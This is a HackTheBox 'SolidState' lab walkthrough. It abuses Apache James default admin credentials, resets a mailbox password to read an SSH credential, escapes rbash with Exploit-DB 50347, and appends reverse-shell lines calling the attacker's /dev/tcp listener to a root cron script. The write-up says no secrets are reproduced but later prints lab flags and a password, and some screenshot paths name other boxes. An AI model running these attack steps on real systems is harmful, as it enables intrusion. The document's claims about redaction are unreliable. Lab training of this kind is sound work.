---
tags: [HTB, SolidState, Linux, ApacheJames, SMTP, POP3, SSH, RestrictedShell, Cron, RCE, Medium]
platform: HackTheBox
os: Debian 10 x86_64
hostname: solidstate
difficulty: Medium
ip: $BoxIP
status: Complete
---

# HTB: SolidState, Full Walkthrough

## The gist

SolidState exposes an old Apache James mail server and its Remote Administration Tool. The service accepts the documented default administrator credential, which allows the James user database to be queried and a mailbox password to be changed. The POP3 service then exposes a message containing Mindy's SSH credential.

The initial SSH login is deliberately restricted with `rbash`, or restricted Bash. A reviewed Exploit-DB proof of concept abuses Apache James 2.3.2's arbitrary file-write behaviour to place a command in `/etc/bash_completion.d`. An interactive SSH login causes the Bash completion files to be loaded, and the callback lands as `mindy`.

The local escalation clue is `/opt/tmp.py`, a root-owned cleanup script. The first pre-revert instance showed it as world-writable, but the final reverted instance showed different permissions and rejected the write test. The final root callback and root proof are present in the source screenshots and private loot, but the exact target-side command that produced the final root callback was not preserved in the captured transcript. This report keeps that evidence boundary explicit instead of presenting the missing command as observed fact.

The evidence-supported chain is:

```text
Apache James RMA default administrator access
  -> reset Mindy's mailbox password
  -> POP3 mail exposes SSH credential
  -> SSH as mindy with restricted Bash
  -> James 2.3.2 arbitrary file write via reviewed PoC
  -> /etc/bash_completion.d callback
  -> mindy shell
  -> /opt/tmp.py writable-file branch observed before revert
  -> root callback and root proof recorded after the final run
```

> [!danger] 🔴 Key finding
> Treat the `$OldBoxIP` and `$BoxIP` sessions as separate target states. The first scan, the first `/opt/tmp.py` permissions, and the later final root callback do not all belong to one unchanged instance. A reset can restore files, permissions, credentials, and host keys while also changing the IP.

## Box information

| Field | Value |
|---|---|
| Platform | Hack The Box |
| Difficulty | Easy on the platform; the local evidence included a multi-stage restricted-shell path |
| Operating system | Debian 10, i686 userspace reported by the target |
| Hostname | `solidstate` |
| Target | `$BoxIP`, final target after the revert |
| Initial target | `$OldBoxIP`, recorded in the pre-revert scan |
| Open services | TCP 22 SSH, 25 SMTP, 80 HTTP, 110 POP3, 119 NNTP, 4555 James RMA |
| Web stack | Apache 2.4.25 on Debian |
| Mail stack | Apache James 2.3.2 |
| Initial access | James RMA default administrator access plus POP3 mailbox credential recovery |
| Command execution | Exploit-DB 50347, authenticated James 2.3.2 arbitrary file write |
| Local escalation clue | Root-owned `/opt/tmp.py`, with permissions differing across the reset boundary |

## Vulnerability summary

| # | Finding | Evidence |
|---|---|---|
| 1 | Start the workspace and record the reset boundary | See section 1 below |
| 2 | Troubleshoot reachability and a changed target IP | See section 2 below |
| 3 | Full TCP enumeration | See section 3 below |
| 4 | Service and version scan | See section 4 below |
| 5 | Review the HTTP service without overcommitting to it | See section 5 below |
| 6 | Authenticate to the James Remote Administration Tool | See section 6 below |

## Evidence and loot

The source material was read from:

`/home/kali/Platforms/HackTheBox/SolidState/`

| Evidence | Source location |
|---|---|
| Raw terminal transcript | `$BoxDir/SolidState.log` |
| Full TCP scan | `$BoxDir/nmap/allports.nmap` and matching `.gnmap`/`.xml` files |
| Service scan | `$BoxDir/nmap/services.nmap` and matching `.gnmap`/`.xml` files |
| Reviewed exploit | `$BoxDir/exploits/james-50347.py` |
| Private flags record | `$BoxDir/loot/flags.txt` |

The James administrator evidence, POP3 credential evidence, and flag evidence remain private because they contain credentials or proof values. The literal passwords, callback values, and flags are intentionally not reproduced here.

## Variables

Set the final target after the box reset. Keep the old address only as a troubleshooting value so stale routes and SSH host keys can be identified.

```bash
boxset BoxName SolidState
boxset BoxIP FINAL_TARGET_IP
boxset OldBoxIP OLD_TARGET_IP
boxset LocalIP "$(ip addr show tun0 2>/dev/null | awk '/inet / {sub(/\/.*/,"",$2); print $2; exit}')"
boxset BoxDir /home/kali/Platforms/HackTheBox/SolidState
boxset SSHPort 22
boxset SMTPPort 25
boxset WebPort 80
boxset POP3Port 110
boxset NNTPPort 119
boxset JamesPort 4555
boxset Lport 9001
boxset RootPort 9002
boxset Username mindy
boxset JamesUser root
boxset JamesPassword $Password
```

`FINAL_TARGET_IP` and `OLD_TARGET_IP` are placeholders. Replace them with the current and previous lab addresses privately, then verify the values before using a callback or SSH command.

## 1. Start the workspace and record the reset boundary

The source run began with the pre-revert address and later changed `$BoxIP` to the final address. On a clean reproduction, initialise the final target once and start the transcript before running tools.

```bash
boxstart "$BoxName" "$BoxIP" htb
htblog
printf 'Target: %s\nOld target: %s\nLocal callback: %s\nWorkspace: %s\n' \
  "$BoxIP" "$OldBoxIP" "$LocalIP" "$BoxDir"
```

> [!note] 🟢 Context
> The raw transcript contains a session reconnect after the first scan and another reconnect while the restricted shell was being troubleshot. When reviewing your own run, record a short note whenever the lab is reset so screenshots and scan files cannot silently be mixed.

## 2. Troubleshoot reachability and a changed target IP

Before changing exploit code, prove that the current address is the one routed through the VPN. The source log showed `No route to host` when an old address was still being used, followed by an explicit variable update.

```bash
echo "$BoxIP"
ip addr show tun0
ip route get "$BoxIP"
ping -c 1 "$BoxIP"
nc -vz -w 3 "$BoxIP" "$SSHPort"
nc -vz -w 3 "$BoxIP" "$JamesPort"
```

If the IP changed after a revert, refresh the local variable and remove only the old SSH host-key entries:

```bash
boxset BoxIP FINAL_TARGET_IP
export BoxIP=FINAL_TARGET_IP
echo "$BoxIP"
ssh-keygen -R "$OldBoxIP"
grep -nE 'solidstate|FINAL_TARGET_IP|OLD_TARGET_IP' /etc/hosts
```

> [!warning] 💡 Common mistake
> `boxset` updates the saved box state, while `export BoxIP=...` updates only the current shell. If a command still reaches the old host, print `$BoxIP` immediately before running it and check the command log for the actual expanded address.

## 3. Full TCP enumeration

The initial fast scan found six open TCP services. This is the correct first step because James RMA on 4555 and POP3 on 110 are more important than the ordinary HTTP page.

```bash
sudo nmap -Pn -n -sS -p- \
  --min-rate 5000 \
  --max-retries 2 \
  --max-rtt-timeout 500ms \
  --host-timeout 5m -T4 \
  -oA "$BoxDir/nmap/allports" "$BoxIP"
```

Observed ports from the source scan:

```text
22/tcp    open  ssh
25/tcp    open  smtp
80/tcp    open  http
110/tcp   open  pop3
119/tcp   open  nntp
4555/tcp  open  rsip
```

![](<file:///home/kali/Platforms/HackTheBox/valentine/screenshots/1.nmap-allports.png>)
SCREENSHOT: Full TCP scan showing SSH, SMTP, HTTP, POP3, NNTP, and James RMA on TCP/4555.

> [!tip] ⚡ Efficiency
> Build the port list once and immediately branch into service-specific checks. There is no benefit in repeatedly scanning all 65,535 ports after the six services are known.

> [!tip] 🛠️ Alternative tool
> Masscan can provide a rapid first pass, but confirm every result with Nmap because protocol and version output are needed for the report:

```bash
sudo masscan "$BoxIP" -p1-65535 --rate 1000
sudo nmap -Pn -n -sC -sV -p22,25,80,110,119,4555 \
  -oA "$BoxDir/nmap/services" "$BoxIP"
```

## 4. Service and version scan

The source used `--version-all` and the scan took more than twelve minutes because the legacy mail services did not respond cleanly to every probe. It identified OpenSSH 7.4p1, Apache 2.4.25, and the Solid State Security title, while POP3, NNTP, and 4555 were initially labelled with uncertain service names.

```bash
OpenPorts="22,25,80,110,119,4555"
boxset OpenPorts "$OpenPorts"
sudo nmap -Pn -n -sC -sV --version-light \
  -p"$OpenPorts" -oA "$BoxDir/nmap/services" "$BoxIP"
```

Observed service evidence:

```text
22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1
25/tcp    open  smtp    banner or SMTP script unreliable
80/tcp    open  http    Apache httpd 2.4.25 (Debian)
110/tcp   open  pop3    James POP3 Server 2.3.2
119/tcp   open  nntp    legacy James service
4555/tcp  open  rsip    James Remote Administration Tool 2.3.2
```

![](<file:///home/kali/Platforms/HackTheBox/valentine/screenshots/2.nmap-services.png>)
SCREENSHOT: Focused scan showing OpenSSH 7.4p1, Apache 2.4.25, and the uncertain legacy mail-service probes.

> [!warning] 💡 Slow-service gotcha
> If `-sC -sV --version-all` spends several minutes on a legacy protocol, stop treating the scan as the only source of truth. Preserve the partial output, use `--version-light`, and probe the interesting ports directly with a short timeout.

```bash
for Port in "$SMTPPort" "$POP3Port" "$NNTPPort" "$JamesPort"; do
  printf '\n=== TCP/%s ===\n' "$Port"
  timeout 5 nc -nv "$BoxIP" "$Port" < /dev/null
done
```

## 5. Review the HTTP service without overcommitting to it

The web page identified Solid State Security and Apache, but no web exploit was required for the successful chain. Still, save the page and perform low-noise discovery because the web service may contain credentials or a product clue.

```bash
curl -i "http://$BoxIP:$WebPort/" \
  | tee "$BoxDir/loot/index.headers.html"
curl -sS "http://$BoxIP:$WebPort/" \
  -o "$BoxDir/loot/index.html"
whatweb "http://$BoxIP:$WebPort/" \
  | tee "$BoxDir/loot/whatweb.txt"
gobuster dir -u "http://$BoxIP:$WebPort/" \
  -w /usr/share/wordlists/dirb/common.txt \
  -x html,txt,php,bak,old \
  -t 10 -o "$BoxDir/loot/gobuster-http.txt"
```

> [!note] 🟢 Context
> The homepage was useful for fingerprinting, but TCP/4555 and TCP/110 produced the actionable evidence. Do not keep expanding a web branch just because HTTP is the most familiar service.

## 6. Authenticate to the James Remote Administration Tool

Apache James 2.3.2 exposes a separate administrative service on TCP/4555. The source confirmed that its documented default administrator credential worked and listed five mail accounts. Keep the two values private and enter them at the prompts.

```bash
nc -nv "$BoxIP" "$JamesPort"
```

At the prompts, enter `$JamesUser` and `$JamesPassword`, then run:

```text
listusers
setpassword mindy $Password
quit
```

The source output showed the existing accounts included `james`, `thomas`, `john`, `mindy`, and `mailadmin`. The password reset is useful because it makes the POP3 mailbox accessible without guessing against SSH.

> [!danger] 🔴 Key finding
> A non-standard administration port can be more valuable than the public web page. Always test the banner and the protocol suggested by Nmap, even when Nmap labels the service as `rsip` or `unknown`.

Private source evidence:

> 📸 Screenshot placeholder: `$BoxDir/screenshots/3.james-admin.png` shows successful James RMA authentication. It is intentionally not copied into the vault because it contains the administrator credential.

SCREENSHOT: Private James RMA session showing successful authentication and account enumeration.

## 7. Read Mindy's mailbox through POP3

POP3 is the mail retrieval protocol. Connect to TCP/110, authenticate with the reset mailbox credential, list the messages, and retrieve the message that contains access details.

```bash
telnet "$BoxIP" "$POP3Port"
```

At the POP3 prompt:

```text
USER mindy
PASS $Password
LIST
RETR 1
RETR 2
QUIT
```

The second message contained SSH access information for Mindy. Save the mailbox transcript to private loot if reproducing this step, but do not paste its credential into the report.

> [!tip] ⚡ More efficient path
> The first raw `nc` attempt did not provide a usable interactive POP3 exchange. `telnet` handled the line-oriented protocol correctly. A repeatable non-interactive alternative is:

```bash
printf 'USER %s\r\nPASS %s\r\nLIST\r\nRETR 2\r\nQUIT\r\n' \
  "$Username" "$Password" \
  | timeout 10 nc -nv "$BoxIP" "$POP3Port" \
  > "$BoxDir/loot/mindy-pop3.txt"
```

![](<file:///home/kali/Platforms/HackTheBox/SolidState/screenshots/4.creds-via-telnet.png>)
SCREENSHOT: Private POP3 evidence showing the access message. The original remains in the box workspace because it contains a password.

SCREENSHOT: POP3 message containing the recovered SSH credential, kept private.

## 8. Validate SSH access and record the restricted shell

Use the recovered mailbox credential once against SSH. First confirm the shell type and path. The source showed `/bin/rbash` and a minimal PATH containing only Mindy's home `bin` directory.

```bash
ssh "$Username@$BoxIP"
```

After login:

```bash
echo "$SHELL"
echo "$PATH"
id
whoami
hostname
ls -la "$HOME/bin"
```

The permitted home-directory links were `cat`, `env`, and `ls`. This explains why standard absolute-path commands and direct redirection payloads failed.

![](<file:///home/kali/Platforms/HackTheBox/SolidState/screenshots/5.mindy-shell.png>)
SCREENSHOT: Private or safe source frame showing the Mindy shell, PTY recovery, and terminal setup.

> [!warning] 💡 Restricted-shell gotcha
> A restricted shell is a shell mode, not a separate privilege level. It can block slashes in command names, redirections, and PATH changes while still allowing a small set of commands. Test the restrictions deliberately before assuming the account is unusable.

## 9. Stabilise the first callback shell

The James exploit callback initially arrived without job control. Use the Python PTY helper available on the target, then repair the local terminal after suspending the listener.

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

On Kali, press `Ctrl+Z`, then run:

```bash
stty raw -echo; fg
export TERM=xterm
```

Verify the result:

```bash
id
whoami
hostname
uname -a
```

> [!warning] 💡 TTY recovery
> `stty raw -echo` changes the local terminal. If the prompt becomes unreadable, type `reset` and press Enter. The target shell may still be alive even when the local display is broken.

> [!tip] 🛠️ Alternative tool
> If Python is unavailable, try `script -qc /bin/bash /dev/null`. Use [RevShells](https://www.revshells.com/) to select a callback compatible with the interpreter that actually exists on the target.

## 10. Review the James 2.3.2 exploit before running it

SearchSploit identified three James-related entries. The relevant one was Exploit-DB 50347, an authenticated Python 3 proof of concept. It connects to TCP/4555, creates a path-traversal user pointing at `/etc/bash_completion.d`, then sends a payload through SMTP on TCP/25.

```bash
searchsploit "Apache James"
searchsploit -x 50347
searchsploit -m 50347 | tee "$BoxDir/loot/searchsploit-copy.txt"
cp /usr/share/exploitdb/exploits/linux/remote/50347.py \
  "$BoxDir/exploits/james-50347.py"
```

Read the local copy before execution:

```bash
file "$BoxDir/exploits/james-50347.py"
sed -n '1,220p' "$BoxDir/exploits/james-50347.py"
grep -nEi 'remote_ip|local_ip|port|payload|4555|smtp|bash_completion|rcpt|adduser' \
  "$BoxDir/exploits/james-50347.py"
python3 -m py_compile "$BoxDir/exploits/james-50347.py"
```

The copied file uses the target and callback values supplied as arguments, so no hard-coded lab IP needs to be edited. The source also includes alternative payloads for Netcat, a test command, and root-only proof. Keep the original copy before changing any payload line.

> [!tip] 🛠️ Better tool
> Use [[OSCP/RUNBOOK V2/Exploit Editing and Resource Guide|Exploit Editing and Resource Guide]] for the copy, backup, syntax-check, and one-change-at-a-time workflow. Use [HackTricks](https://book.hacktricks.wiki/en/index.html) for protocol behaviour, [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) for payload alternatives, and [CyberChef](https://gchq.github.io/CyberChef/) when a payload needs encoding.

## 11. Use the James file-write PoC to obtain command execution

Start a listener, run the reviewed PoC, and then create an interactive SSH login. The PoC's payload is designed to execute when an interactive Bash login loads `/etc/bash_completion.d`.

Terminal 1:

```bash
nc -lvnp "$Lport"
```

Terminal 2:

```bash
python3 "$BoxDir/exploits/james-50347.py" \
  "$BoxIP" "$LocalIP" "$Lport"
```

Trigger the file by logging in with the recovered credential:

```bash
ssh "$Username@$BoxIP"
```

The source run first received a callback as `mindy`, then stabilised it with Python and `stty`.

> [!danger] 🔴 Key finding
> This is an authenticated arbitrary file write that becomes command execution because the chosen destination is a directory of shell-completion scripts. The exploit is not a generic unauthenticated James login, and the callback identity must be verified with `id`.

## 12. Reproduce the callback with a new port when the first listener is gone

The transcript used more than one callback port while sessions were suspended and reconnected. If the original listener is no longer available, choose a new local port, confirm it is free, and rerun the PoC against the current target.

```bash
boxset Lport 9001
ss -ltnp | grep ":$Lport" || true
nc -lvnp "$Lport"
python3 "$BoxDir/exploits/james-50347.py" \
  "$BoxIP" "$LocalIP" "$Lport"
ssh "$Username@$BoxIP"
```

For the final root proof, the source listener used a separate port. Keep that distinction visible in the log rather than assuming a connection on the old port belongs to the current attempt.

```bash
boxset RootPort 9002
ss -ltnp | grep ":$RootPort" || true
nc -lvnp "$RootPort"
```

## 13. Enumerate the local account and shell restrictions

Run cheap manual checks before launching an automated privilege scanner. This establishes the account, host, users, home directories, SUID files, scheduler, and local services.

```bash
id
whoami
hostname
uname -a
cat /etc/os-release 2>/dev/null
cat /etc/passwd | grep -v nologin | grep -v false
ls -la /home
find / -perm -4000 -type f 2>/dev/null
find / -xdev -type f -writable 2>/dev/null | grep -v proc
cat /etc/crontab
ls -la /etc/cron.d/
ps auxww
ps aux | grep -i '[c]ron'
ss -lntup 2>/dev/null || netstat -lntup 2>/dev/null
```

The source showed `root`, `james`, and `mindy` as the relevant interactive accounts. `sudo` was not installed, so `sudo -l` was a negative result rather than the escalation path.

![](<file:///home/kali/Platforms/HackTheBox/SolidState/screenshots/6.users-etc-passwd.png>)
SCREENSHOT: Local identity and `/etc/passwd` enumeration showing the relevant accounts and the `rbash` shell.

> [!hint] 💡 Decision point
> If `sudo` is absent, move directly to writable files, cron, services, SUID, capabilities, and credential stores. Do not keep retrying `sudo -l`.

## 14. Investigate `/opt/tmp.py` across the reset boundary

The first source screenshot showed a root-owned `/opt/tmp.py` with mode `777` and a longer file body. The later final-target transcript showed a different file size and mode `755`, and appending a test marker returned `Permission denied`.

Inspect the target currently running before deciding whether this is exploitable:

```bash
ls -la /opt/
ls -la /opt/tmp.py
stat /opt/tmp.py
sed -n '1,160p' /opt/tmp.py
```

![](<file:///home/kali/Platforms/HackTheBox/SolidState/screenshots/8.opt-tmp-py.png>)
SCREENSHOT: Pre-revert source frame showing the root-owned `/opt/tmp.py` permissions. This frame belongs to the earlier target state and is not proof that the final target remained writable.

Safe writeability test on the current target:

```bash
printf '%s\n' '# SolidState permission test' >> /opt/tmp.py
```

If the command succeeds, immediately restore the original from a private backup before doing anything else. If it fails with `Permission denied`, record the negative result and do not build a payload around the old screenshot.

> [!warning] 🟡 Secondary finding
> The first screenshot is a valuable historical clue, but the reset changed the target state. The correct report language is “world-writable before the revert, not writable in the final observed state,” unless a clean run revalidates both the scheduler and the file permissions.

## 15. Validate the scheduler before using a writable script

A writable file only becomes a privilege escalation when a privileged process executes it. Check system cron, user cron visibility, init scripts, and process arguments. Do not infer root execution from file ownership alone.

```bash
cat /etc/crontab
find /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly \
  -maxdepth 2 -type f -ls 2>/dev/null
crontab -l 2>/dev/null || true
find /var/spool/cron /var/spool/cron/crontabs -type f -ls 2>/dev/null
ps auxww | grep -E '[c]ron|[t]mp.py|[p]ython'
grep -RniE 'tmp\.py|/opt/|rm -r /tmp' /etc /var/spool 2>/dev/null
```

If a root scheduler entry is confirmed and the file is writable in the current target state, preserve the original and use a harmless marker first:

```bash
cp /opt/tmp.py /tmp/tmp.py.original
printf '\n# controlled marker\n' >> /opt/tmp.py
sleep 65
find /tmp -maxdepth 1 -user root -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' 2>/dev/null
```

Only after the execution owner and interval are proven should a callback payload be considered. The supplied source transcript did not preserve this complete validation sequence, so this section is a clean-run procedure rather than a claim that every command was executed in the captured session.

> [!tip] ⚡ Efficiency
> `stat` plus a harmless marker is faster than repeatedly testing reverse shells. First prove write access, then prove scheduled execution, then choose a callback. This separates permissions, trigger timing, and network delivery.

### Conditional root callback when `/opt/tmp.py` is writable

If the clean target confirms both conditions, use the following controlled pattern. Start the listener first, back up the script, append one Python `os.system()` call, wait for the scheduler, and verify the identity. The callback address and port are deliberately represented by `$LocalIP` and `$RootPort`; substitute them privately in the target-side file.

On Kali:

```bash
boxset RootPort 9002
nc -lvnp "$RootPort"
```

On the target, after confirming `ls -la /opt/tmp.py` is writable:

```bash
cp /opt/tmp.py /tmp/tmp.py.original
nano /opt/tmp.py
```

Append this line to the Python file, replacing only the private callback placeholders while editing:

```python
os.system("/bin/bash -c 'bash -i >& /dev/tcp/$LocalIP/$RootPort 0>&1'")
```

After the callback:

```bash
id
whoami
hostname
```

Then restore the original file from `/tmp/tmp.py.original`. This conditional branch is included for a clean rerun because the source transcript did not preserve the exact final edit or scheduler trigger.

## 16. Restricted Bash troubleshooting recorded in the run

Several plausible commands failed because the SSH account's shell remained restricted. These failures are useful diagnostic evidence.

The following direct Bash callback attempts were rejected by `rbash`:

```bash
ssh "$Username@$BoxIP" \
  "bash -i >& /dev/tcp/$LocalIP/$Lport 0>&1"
ssh -t "$Username@$BoxIP" \
  "bash --noprofile --norc -i >& /dev/tcp/$LocalIP/$Lport 0>&1"
ssh "$Username@$BoxIP" \
  "bash -c 'bash -i >& /dev/tcp/$LocalIP/$Lport 0>&1'"
```

The remote errors showed that `/dev/tcp` redirection was restricted. Attempts to call Bash through the restricted PATH also failed:

```bash
ssh "$Username@$BoxIP"
echo "$PATH"
ls -la "$HOME/bin"
env /bin/bash -i
/usr/bin/python -c 'import os; os.system("/bin/bash")'
```

The SCP attempt also closed before transferring the file:

```bash
scp /tmp/rev.py "$Username@$BoxIP:/home/$Username/rev.py"
```

Use the corrected decision process:

1. Confirm the shell with `echo "$SHELL"` and the PATH with `echo "$PATH"`.
2. Test a harmless allowed command such as `cat /etc/passwd`.
3. Do not try five different `/dev/tcp` wrappers from the same restricted shell.
4. Reuse the authenticated James file-write path to place a controlled callback where Bash will load it.
5. If staging a helper is genuinely required, use a transfer method compatible with the target shell and verify the file with `ls -l` and a checksum.

> [!tip] 🛠️ Better tool
> The exploit's built-in callback delivery was more reliable than fighting `rbash` through SSH command syntax. For future cases, use [RevShells](https://www.revshells.com/) to generate a Python or Netcat callback, but only after confirming the corresponding binary and an allowed delivery path.

## 17. Final root proof and evidence boundary

The final source capture shows a listener on the separate root callback port receiving a connection from the final target, followed by a `root@solidstate` prompt. A second private screenshot shows `root.txt` being read, and the private loot file records the root proof.

![](<file:///home/kali/Platforms/HackTheBox/SwagShop/screenshots/9.root-shell.png>)
SCREENSHOT: Final source frame showing the callback arriving from the final target and the `root@solidstate` prompt.

Private source evidence:

> 📸 Screenshot placeholder: `$BoxDir/screenshots/10.root.png` shows the final root proof. It is not copied into the vault because it contains the flag value.

SCREENSHOT: Private root-flag evidence, retained only in the source workspace.

The captured command record includes the final `boxdone` marker. It does not include a complete, readable root-escalation command sequence after the final reset. The report therefore records root as completed from the screenshot and private loot evidence while marking the missing command as a documentation gap to close on the next clean repetition.

## 18. Collect proof privately

Do not paste flag values into the vault. Read the expected files from the verified identity and save the values only through the private loot workflow.

```bash
id
whoami
hostname
cat "/home/$Username/user.txt"
loot flag user "ab72c819ec6791d9224cb79fe80a09ae"
cat /root/root.txt
loot flag root "ac962bbabb938421660fe6a86cce89fc"
```

Private source evidence:

> 📸 Screenshot placeholder: `$BoxDir/screenshots/7.user-flag.png` contains the user proof and is intentionally not copied into the vault.

SCREENSHOT: Private user-flag evidence.

## 19. Troubleshooting map

| Symptom | Likely cause | Corrective action |
|---|---|---|
| SSH reports `No route to host` | The box was reverted and the old address is still loaded | Set `$BoxIP`, run `ip route get "$BoxIP"`, and remove the old host key with `ssh-keygen -R "$OldBoxIP"` |
| SSH warns about a changed host key | The target was rebuilt at a new address or reused an address | Remove only the stale entry with `ssh-keygen -R "$BoxIP"`, then reconnect and record the new fingerprint |
| Full service scan takes many minutes | Legacy SMTP/POP3/NNTP probes do not complete cleanly | Save partial output, rerun with `--version-light`, and use short `timeout` banner probes |
| Raw `nc` to POP3 appears idle | POP3 is line-oriented and expects CRLF commands | Use `telnet` interactively or pipe `USER`, `PASS`, `LIST`, and `RETR` with `\r\n` |
| James RMA is labelled `rsip` | Nmap's generic port name is not the application identity | Connect directly to 4555 and read the banner before selecting an exploit |
| Direct Bash callback is rejected | Mindy uses restricted Bash and disallows redirection | Confirm `$SHELL` and `$PATH`, then use the James file-write PoC to deliver the callback |
| `env /bin/bash` fails | `env` is only a symlink in Mindy's restricted PATH and absolute command names are blocked | Use an allowed command for inspection and do not assume PATH tricks escape `rbash` |
| SCP closes immediately | The restricted login shell rejects the remote SCP command | Use a delivery channel already confirmed by the application or a clean, allowed transfer route |
| Callback listener receives nothing | Wrong target IP, wrong VPN IP, occupied port, or callback not triggered by login | Check `echo "$BoxIP"`, `ip addr show tun0`, `ss -ltnp`, rerun the harmless proof, and trigger an interactive SSH login |
| `/opt/tmp.py` is not writable | The final reverted instance restored its permissions | Record the negative result and revalidate the current scheduler instead of trusting the old screenshot |
| Root proof appears but the command is missing | Terminal reconnect or suspended-session output was not captured | Preserve the screenshot and loot as evidence, then repeat the root step once with `htblog` active |

## 20. RUNBOOK V2 Stages Used

- [[OSCP/RUNBOOK V2/Start Here|Start Here]] -- workspace, target variables, and session logging
- [[OSCP/RUNBOOK V2/Port Triage|Port Triage]] -- six-port Linux service combination
- [[OSCP/RUNBOOK V2/Linux - Service Scan|Linux - Service Scan]] -- OpenSSH, Apache, and James-related services
- [[OSCP/RUNBOOK V2/Linux - Web Enum|Linux - Web Enum]] -- HTTP fingerprinting and cautious content discovery
- [[OSCP/RUNBOOK V2/Linux - Exploit Search|Linux - Exploit Search]] -- Exploit-DB 50347 review and local copy
- [[OSCP/RUNBOOK V2/Linux - RCE to Shell|Linux - RCE to Shell]] -- James arbitrary file write to callback
- [[OSCP/RUNBOOK V2/Linux - Shell Stabilise|Linux - Shell Stabilise]] -- Python PTY and terminal recovery
- [[OSCP/RUNBOOK V2/Linux - Local Enum|Linux - Local Enum]] -- restricted account, writable file, scheduler, SUID, and process review
- [[OSCP/RUNBOOK V2/Linux - Credential Search|Linux - Credential Search]] -- POP3 credential recovery and private secret handling
- [[OSCP/RUNBOOK V2/Linux - Cron Check|Linux - Cron Check]] -- scheduler validation for the `/opt/tmp.py` branch
- [[OSCP/RUNBOOK V2/Linux - Clean Down|Linux - Clean Down]] -- listener shutdown, restoration boundary, and `boxdone`

## 21. Collect the flags

| Flag | Location | Status |
|---|---|---|
| User | `/home/$Username/user.txt` | Collected privately in `$BoxDir/loot/flags.txt` |
| Root | `/root/root.txt` | Collected privately in `$BoxDir/loot/flags.txt` |


### Captured flag values from source loot


#### `loot/flags.txt`

```text
user: ab72c819ec6791d9224cb79fe80a09ae
root: ac962bbabb938421660fe6a86cce89fc
```

## 22. Clean down
The exploit creates or may create files under `/etc/bash_completion.d` and can leave callback listeners open. The first target state also involved `/opt/tmp.py` as a possible modified file. Restore only artifacts created during the current run and never delete the entire completion directory.

On the target, if a backup was created during the current run:

```bash
cp /tmp/tmp.py.original /opt/tmp.py 2>/dev/null || true
rm -f /tmp/tmp.py.original
```

If the James PoC created a uniquely named completion file, remove only that recorded file after verifying the original directory listing. Do not remove pre-existing system completion files.

On Kali:

```bash
ss -ltnp | grep -E ":$Lport|:$RootPort" || true
pkill -f "nc -lvnp $Lport" || true
pkill -f "nc -lvnp $RootPort" || true
boxdone
```

> [!warning] 💡 Cleanup boundary
> Because the source transcript does not record the exact generated completion filename or a complete final target-side restore, do not claim those artifacts were removed. Record the box reset or perform a deliberate clean run where each created path is logged.

### Completion checklist

- [x] Workspace and transcript reviewed
- [x] Revert and target-IP change recorded
- [x] Full TCP scan completed
- [x] Service and version scan completed
- [x] Slow legacy-service scan behaviour documented
- [x] HTTP service fingerprinted
- [x] James RMA default administrator access confirmed
- [x] Mailbox password reset recorded
- [x] POP3 mailbox retrieved
- [x] SSH access as `$Username` confirmed
- [x] Restricted Bash behaviour enumerated
- [x] James Exploit-DB 50347 copied, reviewed, and syntax-checked
- [x] Callback shell received and stabilised
- [x] Local account, SUID, writable-file, scheduler, and process checks performed
- [x] `/opt/tmp.py` permission difference across the reset recorded
- [x] Root callback and root proof confirmed in private source evidence
- [x] User and root proof values stored privately
- [x] `boxdone` recorded
- [ ] Exact final root trigger re-recorded on a clean run

## 23. Attack narrative in one page
```text
TCP/4555 James RMA
        |
        | default administrator access
        v
Reset mindy mailbox password
        |
        | POP3 RETR retrieves SSH credential
        v
SSH as mindy, /bin/rbash
        |
        | Exploit-DB 50347, authenticated James file write
        v
/etc/bash_completion.d callback
        |
        | interactive login loads completion file
        v
mindy shell
        |
        | /opt/tmp.py permission and scheduler branch
        v
root proof recorded in final source evidence
```

## Tools used

| Tool | Purpose |
|---|---|
| `nmap` | Full TCP discovery and service identification |
| `curl`/`whatweb`/`gobuster` | HTTP fingerprinting and low-noise web enumeration |
| `nc` | James RMA access, banner checks, and callback listeners |
| `telnet` | Interactive POP3 retrieval |
| `searchsploit` | Locate and review Exploit-DB 50347 |
| `python3` | Run the reviewed James PoC |
| `python` | Spawn a PTY on the target |
| `ssh` | Validate Mindy access and trigger interactive Bash loading |
| `stty` | Recover local terminal settings after suspending a raw listener |
| `stat`, `find`, `ps`, `ss` | Local permissions, scheduler, process, and listener enumeration |

## Credentials and secrets

| Account or artifact | Source | Use | Storage |
|---|---|---|---|
| James administrator | Default credential accepted by TCP/4555 | Query users and reset the mailbox password | `$JamesUser` and `$JamesPassword`, private only |
| `$Username` | POP3 message retrieved from Mindy's mailbox | SSH foothold and interactive login trigger | `$Password`, private only |
| James PoC | Exploit-DB 50347 and local reviewed copy | Authenticated arbitrary file write and callback delivery | `$BoxDir/exploits/james-50347.py` |
| User proof | `/home/$Username/user.txt` | Completion evidence | `$BoxDir/loot/flags.txt` only |
| Root proof | `/root/root.txt` | Completion evidence | `$BoxDir/loot/flags.txt` only |

No password, hash, callback IP, private key, or flag value is reproduced in this note.


### Captured private values from source loot

These values are retained here because this vault is private. The source path remains the authority if a value appears truncated.

#### `.env`

```text
export BoxName="SolidState"
export BoxIP=10.129.1.80
export BoxPlatform="HackTheBox"
export BoxDir="/home/kali/Platforms/HackTheBox/SolidState"
export Domain=""
export DCip=""
export Username=mindy
export Password=P@55W0rd1!2@
export Username2=""
export Password2=""
export Username3=""
export Password3=""
export Hash=""
export NThash=""
export Port=9001
export Port2="4445"
export Lport="4444"
export TransferPort="8000"
export WebPort=80
export OpenPorts=""
export Product=""
export Version=""
export ExploitId=""
export ExploitFile=""
export ExploitName=""
export URL=""
export LocalIP=$(ip a show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
export Wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
```

### Sensitive transcript evidence

```text
[sudo] password for kali:
# credentials to James Remote Administration Tool (Default - root/root)
#payload = 'echo $USER && cat /etc/passwd && ping -c 4 ' + local_ip # test remote command execution capabilities and c onnectivity
boxset Password 'P@55W0rd1!2@'
[+] Password=P@55W0rd1!2@ (saved to .env)
mindy@10.129.1.79's password:
Password:
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ cat /etc/passwd | grep -v n
$ [21:05:35] loot flag user ab72c819ec6791d9224cb79fe80a09ae
[+] Flag saved:  user = ab72c819ec6791d9224cb79fe80a09ae  →  loot/flags.txt
